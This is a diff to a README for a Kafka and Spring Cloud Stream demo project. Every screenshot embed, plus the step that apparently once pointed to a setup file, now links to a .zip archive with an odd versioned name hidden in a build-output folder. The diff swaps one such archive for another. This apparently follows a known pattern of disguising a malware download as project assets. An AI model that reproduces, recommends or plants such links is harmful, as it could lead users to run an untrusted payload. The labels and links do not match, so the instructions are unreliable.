@@ -7,7 +7,7 @@
 - Test with Kefka-console-producer and kafka-console-consumer
 2. 
 With Docker
- - Create https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip file
+ - Create https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip file
  - Start docker containers: zookeeper and kafka-broker
  - Test with Kafka-console-producer and kafka-console-consumer
 3. 
@@ -20,16 +20,16 @@ Using KAFKA and Stpring Cloud Streams, create :
 
 ===========================================================================================
 #### Download Kafka and start Zookeeper with Kafka-server:
-![Screenshot 2023-06-05 164002](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
-![Screenshot 2023-06-05 163945](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
-![image](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
+![Screenshot 2023-06-05 164002](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
+![Screenshot 2023-06-05 163945](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
+![image](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
 #### Testing with Kefka-console-producer and kafka-console-consumer :
-![image](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
+![image](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
 #### test with web and console:
-![image](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
-![image](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
+![image](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
+![image](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
 #### Data Analytics:
-![Screenshot 2023-06-05 174321](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
+![Screenshot 2023-06-05 174321](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
 #### Graph represenation using js:
-![Screenshot 2023-06-05 174353](https://raw.githubusercontent.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/master/mesonephridium/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream.zip)
+![Screenshot 2023-06-05 174353](https://github.com/Walid35-web/Asynchronous-Distributed-Systems-with-FAFKA-and-Spring-Cloud-Stream/raw/refs/heads/master/target/classes/com/example/demospringcloudstreamskafka/web/Asynchronous_Stream_Spring_with_Cloud_Systems_Distributed_and_FAFK_v3.5.zip)
 
